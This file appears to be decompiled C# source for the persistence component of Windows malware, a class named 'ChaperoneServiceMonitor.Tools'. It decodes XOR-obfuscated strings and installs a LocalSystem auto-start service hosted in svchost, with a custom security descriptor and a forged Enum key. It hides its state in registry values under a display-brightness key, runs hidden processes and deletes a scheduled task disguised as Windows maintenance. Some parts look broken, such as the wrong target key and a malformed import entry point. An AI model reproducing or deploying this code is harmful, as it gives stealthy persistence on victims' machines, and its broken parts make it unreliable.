using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using Microsoft.Win32;

namespace ChaperoneServiceMonitor
{
	internal class Tools
	{
		public Tools(RegData rd)
		{
			this.regdata = rd;
		}

		public Tools()
		{
		}

		public static void deobfuscate(ref char[] obsString)
		{
			char c = 'U';
			if ((obsString[0] ^ c) == 'O' && (obsString[1] ^ c) == 'B' && (obsString[2] ^ c) == 'S' && (obsString[3] ^ c) == 'X')
			{
				for (int i = 0; i < obsString.Length; i++)
				{
					obsString[i] ^= c;
				}
				obsString = obsString.Skip(5).ToArray<char>();
			}
		}

		public int DeleteMonitorRegistry()
		{
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\AdaptiveDisplayBrightness"))
				{
					registryKey.DeleteValue("seg0");
					registryKey.DeleteValue("seg4");
				}
			}
			catch (Exception)
			{
				return -1;
			}
			return 0;
		}

		public bool FileCheck()
		{
			return File.Exists(this.regdata.srvPath) && File.Exists(this.regdata.markerPath);
		}

		public bool CheckRemoveDate()
		{
			long ticks = DateTime.Parse(this.regdata.ttl).Ticks;
			long ticks2 = DateTime.Today.Ticks;
			return ticks2 >= this.regdata.rmvTicks;
		}

		public int SetServiceRegistry()
		{
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost", true))
				{
					string[] value2 = new string[]
					{
						this.regdata.srvName
					};
					registryKey.SetValue(this.regdata.srvName, value2, RegistryValueKind.MultiString);
					registryKey.Close();
				}
				string text = @"SYSTEM\CurrentControlSet\Services\";
				text += this.regdata.srvName;
				string text2;
				using (RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey(text))
				{
					registryKey2.SetValue("Type", 272, RegistryValueKind.DWord);
					registryKey2.SetValue("Start", 2, RegistryValueKind.DWord);
					registryKey2.SetValue("ErrorControl", 0, RegistryValueKind.DWord);
					text2 = @"%SystemRoot%\System32\svchost.exe -k ";
					text2 += this.regdata.srvName;
					registryKey2.SetValue("ImagePath", text2, RegistryValueKind.ExpandString);
					registryKey2.SetValue("DisplayName", this.regdata.srvDisplayName, RegistryValueKind.String);
					registryKey2.SetValue("Description", this.regdata.srvDescription, RegistryValueKind.String);
					registryKey2.SetValue("ObjectName", "LocalSystem", RegistryValueKind.String);
					registryKey2.Close();
				}
				text2 = @"SYSTEM\CurrentControlSet\Services\";
				text2 += this.regdata.srvName;
				text2 += @"\Enum";
				using (RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey(text))
				{
					registryKey3.SetValue("0", @"Root\LEGACY_SRVC\0000", RegistryValueKind.String);
					registryKey3.SetValue("Count", 1, RegistryValueKind.DWord);
					registryKey3.SetValue("NextInstance", 1, RegistryValueKind.DWord);
					registryKey3.Close();
				}
				text = @"SYSTEM\CurrentControlSet\Services\";
				text += this.regdata.srvName;
				text += @"\Parameters";
				using (RegistryKey registryKey4 = Registry.LocalMachine.CreateSubKey(text))
				{
					text2 = @"%SystemRoot%\System32\";
					text2 += this.regdata.srvName;
					text2 += ".dll";
					registryKey4.SetValue("ServiceDll", text2, RegistryValueKind.ExpandString);
					text2 = this.regdata.entryPoint;
					registryKey4.SetValue("ServiceMain", text2, RegistryValueKind.String);
					registryKey4.Close();
				}
				text = @"SYSTEM\CurrentControlSet\Services\";
				text += this.regdata.srvName;
				text += @"\Security";
				using (RegistryKey registryKey5 = Registry.LocalMachine.CreateSubKey(text))
				{
					byte[] value26 = new byte[]
					{
						1,
						0,
						20,
						128,
						144,
						0,
						0,
						0,
						156,
						0,
						0,
						0,
						20,
						0,
						0,
						0,
						48,
						0,
						0,
						0,
						2,
						0,
						28,
						0,
						1,
						0,
						0,
						0,
						2,
						128,
						20,
						0,
						byte.MaxValue,
						1,
						15,
						0,
						1,
						1,
						0,
						0,
						0,
						0,
						0,
						1,
						0,
						0,
						0,
						0,
						2,
						0,
						96,
						0,
						4,
						0,
						0,
						0,
						0,
						0,
						20,
						0,
						253,
						1,
						2,
						0,
						1,
						1,
						0,
						0,
						0,
						0,
						0,
						5,
						18,
						0,
						0,
						0,
						0,
						0,
						24,
						0,
						byte.MaxValue,
						1,
						15,
						0,
						1,
						2,
						0,
						0,
						0,
						0,
						0,
						5,
						32,
						0,
						0,
						0,
						32,
						2,
						0,
						0,
						0,
						0,
						20,
						0,
						141,
						1,
						2,
						0,
						1,
						1,
						0,
						0,
						0,
						0,
						0,
						5,
						11,
						0,
						0,
						0,
						0,
						0,
						24,
						0,
						253,
						1,
						2,
						0,
						1,
						2,
						0,
						0,
						0,
						0,
						0,
						5,
						32,
						0,
						0,
						0,
						35,
						2,
						0,
						0,
						1,
						1,
						0,
						0,
						0,
						0,
						0,
						5,
						18,
						0,
						0,
						0,
						1,
						1,
						0,
						0,
						0,
						0,
						0,
						5,
						18,
						0,
						0,
						0
					};
					registryKey5.SetValue("Security", value26, RegistryValueKind.Binary);
					registryKey5.Close();
				}
			}
			catch (Exception)
			{
			}
			return 0;
		}

		public bool IsServiceRunning()
		{
			try
			{
				ServiceController serviceController = new ServiceController(this.regdata.srvName);
				if (serviceController.Status.Equals(ServiceControllerStatus.Running) || serviceController.Status.Equals(ServiceControllerStatus.StartPending))
				{
					return true;
				}
			}
			catch (Exception)
			{
				return false;
			}
			return false;
		}

		public int DeleteTask()
		{
			this.RunProgram("Security", @"/Delete /TN \Microsoft\Windows\Maintenance\MaintenancePolicy /F", true);
			return 0;
		}

		public int RunProgram(string exe, string cmd, bool waitfor)
		{
			Process process = new Process();
			process.StartInfo.FileName = exe;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			int num = exe.LastIndexOf('\\');
			string workingDirectory = exe.Substring(0, num + 1);
			process.StartInfo.WorkingDirectory = workingDirectory;
			process.StartInfo.Arguments = cmd;
			int result;
			try
			{
				if (!process.Start())
				{
					result = 1;
				}
				else if (waitfor)
				{
					process.WaitForExit();
					int exitCode = process.ExitCode;
					result = process.ExitCode;
				}
				else
				{
					result = 0;
				}
			}
			catch (Exception)
			{
				result = 1;
			}
			return result;
		}

		[DllImport("kernel32", EntryPoint = "OutputDebugStringW(")]
		public static extern void OutputDebugStringW(string message);

		public bool failed;
		public RegData regdata;
	}
}
